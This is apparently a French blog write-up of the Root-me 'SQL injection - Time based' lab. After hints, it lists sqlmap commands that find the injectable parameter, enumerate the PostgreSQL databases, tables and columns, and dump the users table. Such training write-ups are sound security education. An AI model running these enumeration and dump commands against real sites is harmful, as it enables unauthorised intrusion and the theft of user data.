---
title: Root-me - SQL injection - Time based
meta_title: ""
description: 
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - WebServeur
  - Facile
author: Tmax
tags:
  - WebServeur
  - Rootme
  - SQLi
draft: false
---

# Introduction

Pour ce challenge, nous allons devoir réaliser une SQLi basé sur le temps d’exécution. 
Ce qui signifie que nous sommes censé injecter du code qui effectue un delay ou un sleep si ce que nous requêtons est vrai ou non.

{{< tabs >}} {{< tab "Niveau 1" >}}
- Vous avez bien lu la description du challenge ? Les ressources également ?
- Vous avez essayé de regarder des techniques sur Internet ? 
- Vous ne connaissez vraiment pas un outil qui peut vous aider à faire cela ? 
- Vous êtes sur d'avoir essayé d'injecter un payload test dans tous les endpoints ?  

{{< /tab >}}

{{< tab "Niveau 2" >}}

Après quelques recherches, j'ai découvert une documentation pour l'outil `sqlmap` pour réaliser ce genre d'attaque. 

Il s'agit déjà de trouver l'endpoint vulnérable : 

```bash
sqlmap --url "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=" --technique=T --level 5 --risk 3 --batch --random-agent
```

Comme nous connaissons à présent le type de base de donnée, nous recherchons les bases de données : 

```bash
sqlmap --url "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=" --dbms=postgresql --dbs --technique=T --level 5 --risk 3 --threads 10 --batch --random-agent
```

Je requête les tables de cette base : 

```bash
sqlmap --url "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=" --dbms=postgresql -D public --tables --technique=T --level 5 --risk 3 --threads 10 --batch --random-agent  
```

Je requête l'un de ces tables pour connaitre ses colonnes : 

```bash
sqlmap --url "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=" --dbms=postgresql -D public -T users --columns --technique=T --level 5 --risk 3 --threads 10 --batch --random-agent
```

Puis je cherche à présent le contenu de ces colonnes : 

```bash
sqlmap --url "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=" --dbms=postgresql -D public -T users --columns --technique=T --level 5 --risk 3 --threads 10 --dump --batch --random-agent
```

{{< /tab >}}
{{< /tabs >}}